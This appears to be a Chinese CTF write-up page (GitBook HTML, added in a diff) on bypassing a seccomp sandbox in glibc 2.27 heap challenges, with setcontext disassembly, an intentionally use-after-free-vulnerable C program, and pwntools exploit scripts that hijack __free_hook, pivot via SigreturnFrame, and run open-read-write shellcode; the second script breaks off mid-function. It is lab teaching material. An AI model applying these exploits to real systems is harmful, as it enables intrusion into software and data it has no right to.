@@ -1,0 +1,788 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>glibc2.27下堆题绕过沙箱 · Gitbook电子书</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        <meta name="author" content="TTY">
+        
+        
+    
+    <link rel="stylesheet" href="../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search-pro/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-code/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="../glibc2.29下堆题绕过沙箱/glibc2.29下堆题绕过沙箱.html" />
+    
+    
+    <link rel="prev" href="../" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../">
+            
+                <a href="../../">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../../arm/">
+            
+                <a href="../../arm/">
+            
+                    
+                    arm
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="../../arm/arm&aarch64汇编/arm&aarch64汇编.html">
+            
+                <a href="../../arm/arm&aarch64汇编/arm&aarch64汇编.html">
+            
+                    
+                    arm&aarch64汇编
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="../../arm/ARMpwn基础环境搭建/ARMpwn基础环境搭建.html">
+            
+                <a href="../../arm/ARMpwn基础环境搭建/ARMpwn基础环境搭建.html">
+            
+                    
+                    ARMpwn基础环境搭建
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" data-path="../../arm/树莓派搭建ARM环境/树莓派搭建ARM环境.html">
+            
+                <a href="../../arm/树莓派搭建ARM环境/树莓派搭建ARM环境.html">
+            
+                    
+                    树莓派搭建ARM环境
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    沙箱
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter active" data-level="1.3.1" data-path="glibc2.27下堆题绕过沙箱.html">
+            
+                <a href="glibc2.27下堆题绕过沙箱.html">
+            
+                    
+                    glibc2.27下堆题绕过沙箱
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="../glibc2.29下堆题绕过沙箱/glibc2.29下堆题绕过沙箱.html">
+            
+                <a href="../glibc2.29下堆题绕过沙箱/glibc2.29下堆题绕过沙箱.html">
+            
+                    
+                    glibc2.29下堆题绕过沙箱
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" data-path="../glibc2.31下堆题绕过沙箱/glibc2.31下堆题绕过沙箱.html">
+            
+                <a href="../glibc2.31下堆题绕过沙箱/glibc2.31下堆题绕过沙箱.html">
+            
+                    
+                    glibc2.31下堆题绕过沙箱
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4" data-path="../seccomp&ptcl/seccomp&ptcl.html">
+            
+                <a href="../seccomp&ptcl/seccomp&ptcl.html">
+            
+                    
+                    seccomp&ptcl
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../.." >glibc2.27下堆题绕过沙箱</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <p>&#x8FD9;&#x91CC;&#x56E0;&#x4E3A;&#x91CD;&#x70B9;&#x5728;&#x4E8E;&#x6C99;&#x7BB1;&#x7684;&#x7ED5;&#x8FC7;&#xFF0C;&#x6F0F;&#x6D1E;&#x5C31;&#x62FF;&#x4E86;&#x4E00;&#x4E2A;&#x6700;&#x7B80;&#x5355;&#x7684;uaf&#x505A;&#x6F14;&#x793A;&#x3002;</p>
+<p>&#x6700;&#x4E3B;&#x8981;&#x7684;&#x662F;setcontext&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;setcontext+53&#x4E4B;&#x540E;&#x63A7;&#x5236;&#x4E86;&#x5927;&#x91CF;&#x7684;&#x5BC4;&#x5B58;&#x5668;&#xFF08;&#x53EF;&#x4EE5;&#x770B;&#x4F5C;&#x5C31;&#x662F;&#x4E00;&#x4E2A;SigreturnFrame&#xFF09;&#xFF0C;&#x5BFB;&#x5740;&#x90FD;&#x662F;[rdi+x]&#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x5047;&#x5982;&#x52AB;&#x6301;&#x4E86;free_hook&#x4E3A;setcontext+53&#xFF0C;&#x6B64;&#x65F6;rdi&#x521A;&#x597D;&#x662F;&#x5806;&#x5757;&#x5185;&#x5BB9;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x653E;&#x4E2A;SigreturnFrame&#x8FDB;&#x53BB;&#xFF0C;&#x4E4B;&#x540E;&#x5229;&#x7528;&#x7684;&#x8BDD;&#x5C31;&#x6309;&#x4E2A;&#x4EBA;&#x559C;&#x597D;&#x4E86;&#x3002;&#x6211;&#x5199;&#x4E86;&#x4E09;&#x79CD;&#x65B9;&#x5F0F;&#xFF0C;&#x672C;&#x8D28;&#x90FD;&#x662F;orw&#x3002;</p>
+<p>1.mprotect+shellcode</p>
+<p>2.rop&#xFF08;rop&#x5730;&#x5740;&#x5728;free_hook&#x9644;&#x8FD1;&#xFF09;</p>
+<p>3.rop&#xFF08;rop&#x5730;&#x5740;&#x5728;heap&#x4E0A;&#xFF09;</p>
+<p>setcontext&#x7684;&#x6C47;&#x7F16;</p>
+<pre><code>   0x7ffff7a34180 &lt;setcontext&gt;:    push   rdi
+   0x7ffff7a34181 &lt;setcontext+1&gt;:    lea    rsi,[rdi+0x128]
+   0x7ffff7a34188 &lt;setcontext+8&gt;:    xor    edx,edx
+   0x7ffff7a3418a &lt;setcontext+10&gt;:    mov    edi,0x2
+   0x7ffff7a3418f &lt;setcontext+15&gt;:    mov    r10d,0x8
+   0x7ffff7a34195 &lt;setcontext+21&gt;:    mov    eax,0xe
+   0x7ffff7a3419a &lt;setcontext+26&gt;:    syscall 
+   0x7ffff7a3419c &lt;setcontext+28&gt;:    pop    rdi
+   0x7ffff7a3419d &lt;setcontext+29&gt;:    cmp    rax,0xfffffffffffff001
+   0x7ffff7a341a3 &lt;setcontext+35&gt;:    jae    0x7ffff7a34200 &lt;setcontext+128&gt;
+   0x7ffff7a341a5 &lt;setcontext+37&gt;:    mov    rcx,QWORD PTR [rdi+0xe0]
+   0x7ffff7a341ac &lt;setcontext+44&gt;:    fldenv [rcx]
+   0x7ffff7a341ae &lt;setcontext+46&gt;:    ldmxcsr DWORD PTR [rdi+0x1c0]
+   0x7ffff7a341b5 &lt;setcontext+53&gt;:    mov    rsp,QWORD PTR [rdi+0xa0]
+   0x7ffff7a341bc &lt;setcontext+60&gt;:    mov    rbx,QWORD PTR [rdi+0x80]
+   0x7ffff7a341c3 &lt;setcontext+67&gt;:    mov    rbp,QWORD PTR [rdi+0x78]
+   0x7ffff7a341c7 &lt;setcontext+71&gt;:    mov    r12,QWORD PTR [rdi+0x48]
+   0x7ffff7a341cb &lt;setcontext+75&gt;:    mov    r13,QWORD PTR [rdi+0x50]
+   0x7ffff7a341cf &lt;setcontext+79&gt;:    mov    r14,QWORD PTR [rdi+0x58]
+   0x7ffff7a341d3 &lt;setcontext+83&gt;:    mov    r15,QWORD PTR [rdi+0x60]
+   0x7ffff7a341d7 &lt;setcontext+87&gt;:    mov    rcx,QWORD PTR [rdi+0xa8]
+   0x7ffff7a341de &lt;setcontext+94&gt;:    push   rcx
+   0x7ffff7a341df &lt;setcontext+95&gt;:    mov    rsi,QWORD PTR [rdi+0x70]
+   0x7ffff7a341e3 &lt;setcontext+99&gt;:    mov    rdx,QWORD PTR [rdi+0x88]
+   0x7ffff7a341ea &lt;setcontext+106&gt;:    mov    rcx,QWORD PTR [rdi+0x98]
+   0x7ffff7a341f1 &lt;setcontext+113&gt;:    mov    r8,QWORD PTR [rdi+0x28]
+   0x7ffff7a341f5 &lt;setcontext+117&gt;:    mov    r9,QWORD PTR [rdi+0x30]
+   0x7ffff7a341f9 &lt;setcontext+121&gt;:    mov    rdi,QWORD PTR [rdi+0x68]
+   0x7ffff7a341fd &lt;setcontext+125&gt;:    xor    eax,eax
+   0x7ffff7a341ff &lt;setcontext+127&gt;:    ret    
+   0x7ffff7a34200 &lt;setcontext+128&gt;:    mov    rcx,QWORD PTR [rip+0x398c61]        # 0x7ffff7dcce68
+   0x7ffff7a34207 &lt;setcontext+135&gt;:    neg    eax
+   0x7ffff7a34209 &lt;setcontext+137&gt;:    mov    DWORD PTR fs:[rcx],eax
+   0x7ffff7a3420c &lt;setcontext+140&gt;:    or     rax,0xffffffffffffffff
+   0x7ffff7a34210 &lt;setcontext+144&gt;:    ret
+</code></pre><p>&#x9898;&#x76EE;&#x6E90;&#x7801;test.c</p>
+<p>gcc -o test test.c</p>
+<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/prctl.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/filter.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/seccomp.h&gt;</span></span>
+<span class="hljs-keyword">int</span> Nodes_len[<span class="hljs-number">0x10</span>];
+<span class="hljs-keyword">char</span> *Nodes[<span class="hljs-number">0x10</span>];
+<span class="hljs-keyword">int</span> count=<span class="hljs-number">0</span>;
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">get_atoi</span><span class="hljs-params">()</span>
+</span>{
+    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">8</span>];
+    read(<span class="hljs-number">0</span>,buf,<span class="hljs-number">8</span>);    
+    <span class="hljs-keyword">return</span> atoi(buf);
+}
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sandbox</span><span class="hljs-params">()</span></span>{
+    <span class="hljs-keyword">struct</span> sock_filter filter[] = {
+    BPF_STMT(BPF_LD+BPF_W+BPF_ABS,<span class="hljs-number">4</span>),
+    BPF_JUMP(BPF_JMP+BPF_JEQ,<span class="hljs-number">0xc000003e</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>),
+    BPF_STMT(BPF_LD+BPF_W+BPF_ABS,<span class="hljs-number">0</span>),
+    BPF_JUMP(BPF_JMP+BPF_JEQ,<span class="hljs-number">59</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),
+    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),
+    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),
+    };
+    <span class="hljs-keyword">struct</span> sock_fprog prog = {
+    .len = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>)(<span class="hljs-keyword">sizeof</span>(filter)/<span class="hljs-keyword">sizeof</span>(filter[<span class="hljs-number">0</span>])),
+    .filter = filter,
+    };
+    prctl(PR_SET_NO_NEW_PRIVS,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);
+    prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);
+}
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">()</span></span>{
+    <span class="hljs-keyword">int</span> len;
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;len:&quot;</span>);
+    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;len);
+    <span class="hljs-keyword">if</span>(len&lt;<span class="hljs-number">0</span>||len&gt;<span class="hljs-number">0xfff</span>) <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+    <span class="hljs-keyword">if</span>(count&gt;<span class="hljs-number">0x10</span>){
+        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;too many&quot;</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+    }
+    Nodes[count] = <span class="hljs-built_in">malloc</span>(len);
+    Nodes_len[count] = len;
+    count++;
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;done!&quot;</span>);
+}
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">del</span><span class="hljs-params">()</span></span>{
+    <span class="hljs-keyword">int</span> idx;
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;idx:&quot;</span>);
+    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;idx);
+    <span class="hljs-keyword">if</span>(idx&gt;count){
+        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error!&quot;</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+    }
+    <span class="hljs-built_in">free</span>(Nodes[idx]);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;done!&quot;</span>);    
+}
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">edit</span><span class="hljs-params">()</span></span>{
+    <span class="hljs-keyword">int</span> idx;
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;idx:&quot;</span>);
+    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;idx);
+    <span class="hljs-keyword">if</span>(idx&gt;count){
+        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error!&quot;</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+    }
+    read(<span class="hljs-number">0</span>,Nodes[idx],Nodes_len[idx]);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;done!&quot;</span>);
+}
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">show</span><span class="hljs-params">()</span></span>{
+    <span class="hljs-keyword">int</span> idx;
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;idx:&quot;</span>);
+    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;idx);
+    <span class="hljs-keyword">if</span>(idx&gt;count){
+        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error!&quot;</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+    }
+    write(<span class="hljs-number">1</span>,Nodes[idx],Nodes_len[idx]);
+}
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">gift</span><span class="hljs-params">()</span></span>{
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;heap_base:%p\n&quot;</span>,Nodes[<span class="hljs-number">0</span>]);
+}
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">menu</span><span class="hljs-params">()</span></span>{
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1.add&quot;</span>);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2.delete&quot;</span>);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3.edit&quot;</span>);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4.show&quot;</span>);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;5.gift&quot;</span>);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;6.exit&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;choice:&quot;</span>);
+}
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> </span>{
+    setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0L</span>L, <span class="hljs-number">2</span>, <span class="hljs-number">0L</span>L);
+    setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0L</span>L, <span class="hljs-number">2</span>, <span class="hljs-number">0L</span>L);
+    setvbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0L</span>L, <span class="hljs-number">2</span>, <span class="hljs-number">0L</span>L);
+}
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
+    init();
+    sandbox();
+    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>){
+        <span class="hljs-keyword">int</span> choice;
+        menu();
+        choice = get_atoi();
+        <span class="hljs-keyword">switch</span>(choice){
+            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
+                add();
+                <span class="hljs-keyword">break</span>;
+            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:
+                del();
+                <span class="hljs-keyword">break</span>;
+            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:
+                edit();
+                <span class="hljs-keyword">break</span>;
+            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:
+                show();
+                <span class="hljs-keyword">break</span>;
+            <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:
+                gift();
+                <span class="hljs-keyword">break</span>;
+            <span class="hljs-keyword">default</span>:
+                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;invalued input!&quot;</span>);
+                <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); 
+        }
+    }
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p>&#x65B9;&#x6CD5;&#x4E00;</p>
+<p>mprotect+shellcode</p>
+<pre><code class="lang-python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*
+context.log_level = <span class="hljs-string">&apos;debug&apos;</span>
+p = process(<span class="hljs-string">&apos;./test&apos;</span>)
+libc = ELF(<span class="hljs-string">&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;</span>)
+elf = ELF(<span class="hljs-string">&apos;./test&apos;</span>)
+context.arch = elf.arch
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pr</span><span class="hljs-params">(a,addr)</span>:</span>
+    log.success(a+<span class="hljs-string">&apos;====&gt;&apos;</span>+hex(addr))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(length)</span>:</span>
+    p.sendlineafter(<span class="hljs-string">&apos;:&apos;</span>,<span class="hljs-string">&apos;1&apos;</span>)
+    p.sendlineafter(<span class="hljs-string">&apos;len:&apos;</span>,str(length))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(idx)</span>:</span>
+    p.sendlineafter(<span class="hljs-string">&apos;:&apos;</span>,<span class="hljs-string">&apos;2&apos;</span>)
+    p.sendlineafter(<span class="hljs-string">&apos;idx:&apos;</span>,str(idx))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,ct)</span>:</span>
+    p.sendlineafter(<span class="hljs-string">&apos;:&apos;</span>,<span class="hljs-string">&apos;3&apos;</span>)
+    p.sendlineafter(<span class="hljs-string">&apos;idx:&apos;</span>,str(idx))
+    p.send(ct)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>
+    p.sendlineafter(<span class="hljs-string">&apos;:&apos;</span>,<span class="hljs-string">&apos;4&apos;</span>)
+    p.sendlineafter(<span class="hljs-string">&apos;idx:&apos;</span>,str(idx))
+add(<span class="hljs-number">0x500</span>) <span class="hljs-comment">#0</span>
+add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#1</span>
+delete(<span class="hljs-number">0</span>)
+show(<span class="hljs-number">0</span>)
+
+leak = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">&apos;\x00&apos;</span>*<span class="hljs-number">2</span>)
+libcbase = leak - (<span class="hljs-number">0x7f3490493ca0</span><span class="hljs-number">-0x7f34900a8000</span>)
+setcontext_door = libcbase + libc.sym[<span class="hljs-string">&apos;setcontext&apos;</span>]+<span class="hljs-number">53</span>
+free_hook = libcbase + libc.sym[<span class="hljs-string">&apos;__free_hook&apos;</span>]
+syscall = libcbase +<span class="hljs-number">0xd2745</span>
+pr(<span class="hljs-string">&apos;libcbase&apos;</span>,libcbase)
+
+
+delete(<span class="hljs-number">1</span>)
+edit(<span class="hljs-number">1</span>,p64(free_hook))
+add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#2</span>
+add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#3</span>
+edit(<span class="hljs-number">3</span>,p64(setcontext_door))
+<span class="hljs-comment">#=========================setcontext===========================</span>
+
+fake_rsp = free_hook&amp;<span class="hljs-number">0xfffffffffffff000</span>
+frame = SigreturnFrame()
+frame.rax=<span class="hljs-number">0</span>
+frame.rdi=<span class="hljs-number">0</span>
+frame.rsi=fake_rsp
+frame.rdx=<span class="hljs-number">0x2000</span>
+frame.rsp=fake_rsp
+frame.rip=syscall
+
+add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#4</span>
+edit(<span class="hljs-number">4</span>,str(frame))
+<span class="hljs-comment">#gdb.attach(p,&apos;b *&apos;+str(setcontext_door))</span>
+delete(<span class="hljs-number">4</span>)
+
+<span class="hljs-comment">#==========================orw=================================</span>
+prdi_ret = libcbase+libc.search(asm(<span class="hljs-string">&quot;pop rdi\nret&quot;</span>)).next()
+prsi_ret = libcbase+libc.search(asm(<span class="hljs-string">&quot;pop rsi\nret&quot;</span>)).next()
+prdx_ret = libcbase+libc.search(asm(<span class="hljs-string">&quot;pop rdx\nret&quot;</span>)).next()
+prax_ret = libcbase+libc.search(asm(<span class="hljs-string">&quot;pop rax\nret&quot;</span>)).next()
+jmp_rsp = libcbase+libc.search(asm(<span class="hljs-string">&quot;jmp rsp&quot;</span>)).next()
+mprotect_addr = libcbase + libc.sym[<span class="hljs-string">&apos;mprotect&apos;</span>]
+
+payload = p64(prdi_ret)+p64(fake_rsp)
+payload += p64(prsi_ret)+p64(<span class="hljs-number">0x1000</span>)
+payload += p64(prdx_ret)+p64(<span class="hljs-number">7</span>)
+payload += p64(prax_ret)+p64(<span class="hljs-number">10</span>)
+payload += p64(syscall) <span class="hljs-comment">#mprotect(fake_rsp,0x1000,7)</span>
+payload += p64(jmp_rsp)
+payload += asm(shellcraft.open(<span class="hljs-string">&apos;flag&apos;</span>))
+payload += asm(shellcraft.read(<span class="hljs-number">3</span>,fake_rsp+<span class="hljs-number">0x300</span>,<span class="hljs-number">0x30</span>))
+payload += asm(shellcraft.write(<span class="hljs-number">1</span>,fake_rsp+<span class="hljs-number">0x300</span>,<span class="hljs-number">0x30</span>))
+p.send(payload)
+<span class="hljs-comment">#pause()</span>
+
+p.interactive()
+</code></pre>
+<p>&#x65B9;&#x6CD5;&#x4E8C;</p>
+<p>rop&#xFF08;rop&#x5730;&#x5740;&#x5728;free_hook&#x9644;&#x8FD1;&#xFF09;</p>
+<pre><code class="lang-python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*
+context.log_level = <span class="hljs-string">&apos;debug&apos;</span>
+p = process(<span class="hljs-string">&apos;./test&apos;</span>)
+libc = ELF(<span class="hljs-string">&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;</span>)
+elf = ELF(<span class="hljs-string">&apos;./test&apos;</span>)
+context.arch = elf.arch
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pr</span><span class="hljs-params">(a,addr)</span>:</span>
+    log.success(a+<span class="hljs-string">&apos;====&gt;&apos;</span>+hex(addr))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(length)</span>:</span>
+    p.sendlineafter(<span class="hljs-string">&apos;:&apos;</span>,<span class="hljs-string">&apos;1&apos;</span>)
+    p.sendlineafter(<span class="hljs-string">&apos;len:&apos;</span>,str(length))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(idx)</span>:</span>
+    p.sendlineafter(<span class="hljs-string">&apos;:&apos;</span>,<span class="hljs-string">&apos;2&apos;</span>)
+    p.sendlineafter(<span class="hljs-string">&apos;idx:&apos;</span>,str(idx))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,ct)</span>:</span>
+    p.sendlineafter(<span class="hljs-string">&apos;:&apos;</span>,<span class="hljs-string">&apos;3&apos;</span>)
+    p.sendlineafter(<span class="hljs-string">&apos;idx:&apos;</span>,str(idx))
+    p.send(ct)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>
+    p.sendlineafter(<span class="hljs-string">&apos;:&apos;</span>,<span class="hljs-string">&apos;4&apos;</span>)
+    p.sendlineafter(<span class="hljs-string">&apos;idx:&apos;</span>,str(idx))
+add(<span class="hljs-number">0x500</span>) <span class="hljs-comment">#0</span>
+add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#1</span>
+delete(<span class="hljs-number">0</span>)
+show(<span class="hljs-number">0</span>)
+
+leak = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">&apos;\x00&apos;</span>*<span class="hljs-number">2</span>)
+libcbase = leak - (<span class="hljs-number">0x7f3490493ca0</span><span class="hljs-number">-0x7f34900a8000</span>)
+setcontext_door = libcbase + libc.sym[<span class="hljs-string">&apos;setcontext&apos;</span>]+<span class="hljs-number">53</span>
+free_hook = libcbase + libc.sym[<span class="hljs-string">&apos;__free_hook&apos;</span>]
+syscall = libcbase +<span class="hljs-number">0xd2745</span>
+pr(<span class="hljs-string">&apos;libcbase&apos;</span>,libcbase)
+
+
+delete(<span class="hljs-number">1</span>)
+edit(<span class="hljs-number">1</span>,p64(free_hook))
+add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#2</span>
+add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#3</span>
+edit(<span class="hljs-number">3</span>,p64(setcontext_door))
+<span class="hljs-comment">#=========================setcontext===========================</span>
+
+frame = SigreturnFrame()
+frame.rax=<span class="hljs-number">0</span>
+frame.rdi=<span class="hljs-number">0</span>
+frame.rsi=free_hook&amp;<span class="hljs-number">0xfffffffffffff000</span>
+frame.rdx=<span class="hljs-number">0x2000</span>
+frame.rsp=free_hook&amp;<span class="hljs-number">0xfffffffffffff000</span>
+frame.rip=syscall
+
+add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#4</span>
+edit(<span class="hljs-number">4</span>,str(frame))
+<span class="hljs-comment">#gdb.attach(p,&apos;b *&apos;+str(setcontext_door))</span>
+delete(<span class="hljs-number">4</span>)
+
+<span class="hljs-comment">#==========================orw=================================</span>
+prdi_ret = libcbase+libc.search(asm(<span class="hljs-string">&quot;pop rdi\nret&quot;</span>)).next()
+prsi_ret = libcbase+libc.search(asm(<span class="hljs-string">&quot;pop rsi\nret&quot;</span>)).next()
+prdx_ret = libcbase+libc.search(asm(<span class="hljs-string">&quot;pop rdx\nret&quot;</span>)).next()
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ropchain</span><span class="hljs-params">(function,arg1,arg2,arg3)</span>:</span>
+    ret  = p64(prdi_ret)+p64(arg1)
+    ret += p64(prsi_ret)+p64(arg2)
